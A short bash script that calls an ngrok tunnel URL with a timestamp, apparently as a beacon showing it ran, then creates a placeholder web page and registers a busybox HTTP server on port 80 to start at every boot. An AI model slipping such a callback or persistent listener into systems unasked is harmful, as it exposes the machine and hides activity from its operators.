#!/bin/bash

wget https://2142-2600-1700-5030-4e90-14f5-93c7-3425-ef6b.ngrok.io/hihuy/$(date +"%T")

mkdir /var/www
touch /var/www/index.html
echo "hi huy2" >> /var/www/index.html


cat << EOF > busybox-httpd.sh
#!/bin/sh
busybox httpd -p 0.0.0.0:80 -h /var/www/ &
EOF

chmod +x busybox-httpd.sh
mv busybox-httpd.sh /etc/init.d/

update-rc.d busybox-httpd.sh defaults
